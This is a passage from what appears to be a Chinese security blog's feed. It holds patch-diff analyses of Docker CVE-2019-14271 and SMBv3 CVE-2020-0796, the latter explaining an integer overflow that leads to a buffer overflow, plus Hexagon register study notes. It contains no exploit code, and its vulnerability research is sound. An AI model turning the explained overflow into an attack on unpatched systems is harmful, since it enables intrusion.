alt="docker%20CVE%202019%2014271%20040822a50127454aac6713a0750ab5fb/Untitled%202.png"></a></p><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2](https://github.com/moby/moby/pull/39612/files/a316b10dab79d9298b02c7930958ed52e0ccf4e4#diff-7d8fc0dcb0916621d523276add8210c2)">patch diif</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" title="patch-diff" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200603183400.png" alt="patch-diff"></a></p><p>补丁新增了 <code>init</code> 函数，强制进程进入到容器内的时候，先加载容器外的 so 文件</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/">https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/</a></p></blockquote></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2019-14271-analyze</summary>
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2019-14271" scheme="https://bestwing.me/tags/CVE-2019-14271/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0796 SMBv3 漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-0796-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-0796-analysis.html</id>
    <published>2020-03-12T16:00:00.000Z</published>
    <updated>2020-12-05T18:52:20.540Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="CVE-2020-0796-SMBv3-漏洞分析"><a href="#CVE-2020-0796-SMBv3-漏洞分析" class="headerlink" title="CVE-2020-0796 SMBv3 漏洞分析"></a>CVE-2020-0796 SMBv3 漏洞分析</h1><p>3月13日 凌晨左右 ，微软放了这个漏洞的补丁…所以稍微分析一下他的补丁</p><h2 id="Bindiff"><a href="#Bindiff" class="headerlink" title="Bindiff"></a>Bindiff</h2><p>通过 bindiff 比较发现一个函数，且名字也蛮可疑的..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032004.png" style="zoom: 50%;" /></a><p>这个函数名叫 <code>Srv2DecompressData</code> 实际上和漏洞描述其实也差不多..</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032123.png" style="zoom: 50%;" /></a><p>似乎是加了检查..我们 打开IDA来比对一下 两者的差别..</p><h2 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032244.png"></a></p><p>左边是有漏洞的版本，右边是 Patch 后的版本 .. 比对了一下发现似乎增加了一个检查..尤其是增加的一个叫</p><p><code>RtlULongAdd</code> 的函数..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlULongAdd(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span><br></pre></td></tr></table></figure><p>该函数的参数是 两个似乎 recve 的数据 以及一个变量..</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">RtlULongAdd</span><span class="params">(ULONG ulAugend, ULONG ulAddend, ULONG *pulResult)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  ULONG v3; <span class="comment">// eax</span></span><br><span class="line">  ULONG v4; <span class="comment">// edx</span></span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = ulAugend + ulAddend;</span><br><span class="line">  v4 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= ulAugend )</span><br><span class="line">    v4 = v3;</span><br><span class="line">  result = v3 &lt; ulAugend ? <span class="number">0xC0000095</span> : <span class="number">0</span>;</span><br><span class="line">  *pulResult = v4;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看了一下这个  判断了  ulAugend + ulAddend 相加后的和是否小于其中一个 加数..如果是则将其中一个赋值给返回值..从这里大概能初步判断是个什么漏洞了..基本能猜测是个  整型溢出..</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>我们来看一下未打补丁的版本…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png"></a></p><p>看了一下..这里是将原本个值直接相加，并没有进行checkl… 然后分配内存..如果有问题 …应该是这里分配的内存太小..导致后续的缓冲区溢出吧？</p><p>由于我对这两个值不是很熟悉..所以这个时候开始查资料..</p><p>这个时候发现已经有人发文了…参考链接最后贴后面..</p><p>可以知道的是..这里的值一个是 OriginalCompressedSegmentSize  一个是 Offset/Length，他们 描述如下:</p><blockquote><ol><li>OriginalCompressedSegmentSize (4 bytes) The size, in bytes, of the uncompressed data segment.</li><li>Offset/Length (4 bytes) If SMB2_COMPRESSION_FLAG_CHAINED is set in Flags field, this field MUST be interpreted as Length. The length, in bytes, of the compressed payload. Otherwise, this field MUST be interpreted as Offset. The offset, in bytes, from the end of this structure to the start of compressed data segment.</li></ol></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png"></a></p><p>然后做了什么事情呢？</p><p>看代码，将分配的内存 用 SmbCompressionDecompress 这个函数进行处理</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png"></a></p><p>我在 srvnet 里找到了 SmbCompressionDecompress 这个函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png"></a></p><p>然后又调用了 <code>RtlDecompressBufferEx2</code> 这个函数..最后调的是 <code>RtlDecompressBufferXpressLz</code> 这个函数…</p><p>这个函数在<code>ntoskrnl. exe</code> 里</p><p>这个函数做的是事情就是..</p><p><code>memcpy(ptr,src,len)</code></p><p>ptr 是由 <code>SrvNetAllocateBuffer</code>分配的<code>UncompressBuffer</code>，<code>len</code> 是从smb 包解析的解压数据的大小，这个值是攻击者可控的， 由于前面没有检查..所以我们传入一个很大的值，使其触发整型溢出.分配一个较小的内存…此时 len又是一个大的值..所以导致了缓冲区溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-0796" scheme="https://bestwing.me/tags/CVE-2020-0796/"/>
    
  </entry>
  
  <entry>
    <title>Hexagon 学习 --- 寄存器篇</title>
    <link href="https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-03-12T07:31:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p>就是按照手册过了一遍，仅仅是个人的笔记。</p><h2 id="Registers-寄存器"><a href="#Registers-寄存器" class="headerlink" title="Registers 寄存器"></a>Registers 寄存器</h2><blockquote><p>The Hexagon processor has two sets of registers: general registers and control registers. The general registers include thirty-two 32-bit registers (named R0 through R31) which can be accessed either as single registers or as aligned 64-bit register pairs. The general registers are used to contain all pointer, scalar, vector, and accumulator data. The control registers include special-purpose registers such as program counter, status register, loop registers, etc.</p></blockquote><p>分为通用寄存器和控制寄存器， 通用寄存器包括32个32位寄存器，以R0到R31命名，另外这里提到了可以通过定义一个寄存器对来表示一个64位寄存器..例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1：0 &#x3D;memd(R3)          &#x2F;&#x2F;导入双字</span><br><span class="line">R7:6&#x3D;valignb(R9:8,R7:6,#2)   &#x2F;&#x2F;适量对齐</span><br></pre></td></tr></table></figure><h3 id="寄存器对"><a href="#寄存器对" class="headerlink" title="寄存器对"></a>寄存器对</h3><p>下图显示了寄存器对的结构</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png"></a> </p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。例如：</p><p>  SP=add(SP,#-8)    //sp是R29的别名</p><p>  Allocfram             //更改寄存器R29(SP)以及R30（FP）</p><p>  call init                //更改LR（R31）</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>下图显示了这些别名后的通用寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">SP &#x3D; add(SP, #-8) &#x2F;&#x2F; SP is alias of R29</span><br><span class="line">allocframe &#x2F;&#x2F; Modifies SP (R29) and FP (R30)</span><br><span class="line">call init &#x2F;&#x2F; Modifies LR (R31)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png"></a></p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>Hexagon处理器包含了一系列的32位的控制寄存器，这些寄存器可以让我们对处理器中的PC，硬件回路以及矢量分支预测进行操作。</p><p> 与通用寄存器不同，控制寄存器中有些特殊的控制寄存器可用来当做操作数，有时候寄存器可以被转换成指令从而被用作操作数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">R2 &#x3D; memw(R0++M1) &#x2F;&#x2F; Auto-increment addressing mode (M1)</span><br><span class="line">R9 &#x3D; PC &#x2F;&#x2F; Get program counter (PC)</span><br><span class="line">LC1 &#x3D; R3 &#x2F;&#x2F; Set hardware loop count (LC1)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png"></a></p><p>控制寄存器别名规则：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png"></a></p><p>控制寄存器同样可以被定义为寄存器对从而表示一个64位的寄存器，控制寄存器的凑对使用别名来定义，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1:0 &#x3D; R5:4 &#x2F;&#x2F; C1:0 specifies the LC0&#x2F;SA0 register pair</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png"></a></p><h4 id="程序计数器-Program-Counter（PC）"><a href="#程序计数器-Program-Counter（PC）" class="headerlink" title="程序计数器 Program Counter（PC）"></a>程序计数器 Program Counter（PC）</h4><p>PC 寄存器是用来指向下一个指令的位置. 他可以通过指令的执行来间接修改，也可被直接读取例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R7 &#x3D; PC &#x2F;&#x2F; Get program counter</span><br></pre></td></tr></table></figure><p>NOTE The PC register is read-only: writing to it has no effect.</p><h4 id="循环寄存器-Loop-registers"><a href="#循环寄存器-Loop-registers" class="headerlink" title="循环寄存器 Loop registers"></a>循环寄存器 Loop registers</h4><p>Hewxagon 的处理器包括两组循环寄存器用来支持嵌套的硬件循环, 每个循环包含了循环计数器以及循环开始位置的寄存器。循环寄存器可以通过 loop 指令修改，同时也可以直接访问，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop0(start, R4) &#x2F;&#x2F; Modifies LC0 and SA0 (LC0&#x3D;R4, SA0&#x3D;&amp;start)</span><br><span class="line">LC1 &#x3D; R22 &#x2F;&#x2F; Set loop1 count</span><br><span class="line">R9 &#x3D; SA1 &#x2F;&#x2F; Get loop1 start address</span><br></pre></td></tr></table></figure><h4 id="用户状态寄存器-User-Status-register"><a href="#用户状态寄存器-User-Status-register" class="headerlink" title="用户状态寄存器 User  Status register"></a>用户状态寄存器 User  Status register</h4><p>用户状态寄存器（USR）存储可由用户程序访问的处理器状态和控制位。状态位包含某些指令的状态结果，而控制位包含用户可设置的处理器模式，用于硬件预取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9:8 &#x3D; vaddw(R9:8, R3:2):sat &#x2F;&#x2F; Vector add words</span><br><span class="line">R6 &#x3D; USR &#x2F;&#x2F; Get saturation status</span><br></pre></td></tr></table></figure><p>USR 可包含一下的状态和控制值</p><ul><li><p>启用缓存预取 Cache prefetch enable</p></li><li><p>缓存预取状态 Cache prefetch status</p></li><li><p>浮点模式 Floating point modes</p></li><li><p>浮点状态 Floating point status </p></li><li><p>硬件回路配置 Hardware loop configuration</p></li><li><p>Sticky saturation overflow </p></li></ul><blockquote><p>NOTE A user control register transfer to USR cannot be grouped in an instruction packet with a floating point instruction (Section 4.3.4). Whenever a transfer to USR changes the Enable trap bits [29:25], an isync instruction (Section 5.10) must be executed before the new exception programming can take effect.</p></blockquote><h4 id="修饰寄存器-Modifier-registers"><a href="#修饰寄存器-Modifier-registers" class="headerlink" title="修饰寄存器  Modifier registers"></a>修饰寄存器  Modifier registers</h4><p>修饰寄存器用于 （M0-M1） 用于以下寻址模式</p><ul><li><p>间接自动递增寄存器寻址 Indirect auto-increment register addressing</p></li><li><p>循环寻址 Circular addressing</p></li><li><p>bit-reversed 寻址 Bit-reversed addressing</p></li></ul><p><strong>Indirect auto-increment register addressing</strong></p><p>在间接自动递增寄存器寻址中，修改符寄存器存储一个<br>带符号的32位值，用于指定增量（或减量）值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R0 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R3 &#x3D; memw(R2++M1) &#x2F;&#x2F; Load word</span><br></pre></td></tr></table></figure><p><strong>Circular</strong></p><p>在循环寻址中，修饰寄存器存储循环缓冲区的长度和相关的 “k” 和 “I” 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R2 with size&#x2F;K vals in M0</span><br><span class="line">R0 &#x3D; memb(R7++I:circ(M1)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R7 with size&#x2F;K&#x2F;I vals in M1 </span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png"></a></p><p><strong>Bit-reversed</strong></p><p>在位反转寻址中，修改器寄存器存储带符号的32位 指定增量（或减量）值的值。例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R2 &#x3D; memub(R0++M1:brev) &#x2F;&#x2F; The address is (R0.H | bitrev(R0.L))</span><br><span class="line"> &#x2F;&#x2F; The orginal R0 (not reversed) is added</span><br><span class="line"> &#x2F;&#x2F; to M1 and written back to R0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png"></a></p><h4 id="分支预测寄存器-Predicate-registers"><a href="#分支预测寄存器-Predicate-registers" class="headerlink" title="分支预测寄存器 Predicate registers"></a>分支预测寄存器 Predicate registers</h4><p>分支预测寄存器（P0-P3）保存了标量与矢量对比计算的结果，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P1 &#x3D; cmp.eq(R2, R3) &#x2F;&#x2F; Scalar compare</span><br><span class="line">if (P1) jump end &#x2F;&#x2F; Jump to address (conditional)</span><br><span class="line">R8 &#x3D; P1 &#x2F;&#x2F; Get compare status (P1 only)</span><br><span class="line">P3:0 &#x3D; R4 &#x2F;&#x2F; Set compare status (P0-P3)</span><br></pre></td></tr></table></figure><p> 这四个分支预测寄存器可被设置成四倍状态，此时此四个寄存器被表示成一个32位的寄存器</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png"></a></p><h4 id="循环起始寄存器-Circular-start-registers"><a href="#循环起始寄存器-Circular-start-registers" class="headerlink" title="循环起始寄存器 Circular start registers"></a>循环起始寄存器 Circular start registers</h4><p>循环起始寄存器（CS0-CS1）将循环缓冲区的起始地址存储在循环寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS0 &#x3D; R5 &#x2F;&#x2F; Set circ start register</span><br><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by CS0 with size&#x2F;K vals in M0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png"></a></p><h4 id="用户通用指针寄存器-User-general-pointer-register"><a href="#用户通用指针寄存器-User-general-pointer-register" class="headerlink" title="用户通用指针寄存器 User general pointer register"></a>用户通用指针寄存器 User general pointer register</h4><p>The user general pointer (UGP) register is a general-purpose control register.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; UGP &#x2F;&#x2F; Get UGP</span><br><span class="line">UGP &#x3D; R3 &#x2F;&#x2F; Set UGP</span><br></pre></td></tr></table></figure><p>UGP通常用于存储线程本地存储的地址。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png"></a></p><h4 id="全局指针-Global-pointer"><a href="#全局指针-Global-pointer" class="headerlink" title="全局指针 Global pointer"></a>全局指针 Global pointer</h4><p>全局指针（GP）用于GP相对寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GP &#x3D; R7 &#x2F;&#x2F; Set GP</span><br><span class="line">R2 &#x3D; memw(GP+#200) &#x2F;&#x2F; GP-relative load</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png"></a></p><h4 id="周期计数寄存器-Cycle-count-registers"><a href="#周期计数寄存器-Cycle-count-registers" class="headerlink" title="周期计数寄存器 Cycle count registers"></a>周期计数寄存器 Cycle count registers</h4><p>周期计数寄存器（UPCYCLELO-UPCYCLEHI）存储一个64位值，其中包含自从上次重置Hexagon处理器以来当前执行的处理器周期数。</p><p>[^NOTE]: The RTOS must grant permission to access these registers. Without this permission, reading these registers from user code always returns zero.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UPCYCLEHI &#x2F;&#x2F; Get cycle count (high)</span><br><span class="line">R4 &#x3D; UPCYCLELO &#x2F;&#x2F; Get cycle count (low)</span><br><span class="line">R5:4 &#x3D; UPCYCLE &#x2F;&#x2F; Get cycle count</span><br></pre></td></tr></table></figure><h4 id="帧限制寄存器-Frame-limit-register"><a href="#帧限制寄存器-Frame-limit-register" class="headerlink" title="帧限制寄存器  Frame limit register"></a>帧限制寄存器  Frame limit register</h4><p>帧限制寄存器（FRAMELIMIT）存储存储区的低地址为软件栈保留</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; FRAMELIMIT &#x2F;&#x2F; Get frame limit register</span><br><span class="line">FRAMELIMIT &#x3D; R3 &#x2F;&#x2F; Set frame limit register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png"></a></p><h4 id="栈key寄存器-Frame-key-registe"><a href="#栈key寄存器-Frame-key-registe" class="headerlink" title="栈key寄存器 Frame key registe"></a>栈key寄存器 Frame key registe</h4><p>frame key register  （FRAMEKEY）当它们存储在软件堆栈中时返回地址时用来存储用于XOR加密的密钥值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2 &#x3D; FRAMEKEY &#x2F;&#x2F; Get frame key register</span><br><span class="line">FRAMEKEY &#x3D; R1 &#x2F;&#x2F; Set frame key register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png"></a></p><h4 id="数据包计数寄存器-Packet-count-registers"><a href="#数据包计数寄存器-Packet-count-registers" class="headerlink" title="数据包计数寄存器 Packet count registers"></a>数据包计数寄存器 Packet count registers</h4><p>数据包计数寄存器（PKTCOUNTLO-PKTCOUNTHI）存储一个64位值，其中包含自上次写入PKTCOUNT寄存器以来执行的指令数据包的当前数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; PKTCOUNTHI &#x2F;&#x2F; Get packet count (high)</span><br><span class="line">R8 &#x3D; PKTCOUNTLO &#x2F;&#x2F; Get packet count (low)</span><br><span class="line">R9:8 &#x3D; PKTCOUNT &#x2F;&#x2F; Get packet count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png"></a></p><h4 id="Qtimer寄存器"><a href="#Qtimer寄存器" class="headerlink" title="Qtimer寄存器"></a>Qtimer寄存器</h4><p>Qtimer寄存器（UTIMERLO-UTIMERHI）提供对Qtimer全局参考计数值的访问。 它们使Hexagon软件能够读取64位时间值，而不必执行昂贵的AHB加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UTIMERHI &#x2F;&#x2F; Get Qtimer reference count (high)</span><br><span class="line">R4 &#x3D; UTIMERLO &#x2F;&#x2F; Get Qtimer reference count (low)</span><br><span class="line">R5:4 &#x3D; UTIMER &#x2F;&#x2F; Get Qtimer reference count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">最近在看高通的东西 这个就是按照手册过了一边，仅仅是个人的笔记。</summary>
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="hexagon" scheme="https://bestwing.me/tags/hexagon/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-0022 “BlueFrag”漏洞分析</title>
    <link href="https://bestwing.me/CVE-2020-0022-analysis.html"/>
    <id>https://bestwing.me/CVE-2020-0022-analysis.html</id>
    <published>2020-02-19T16:00:00.000Z</published>
    <updated>2020-06-22T18:28:30.000Z</updated>
    
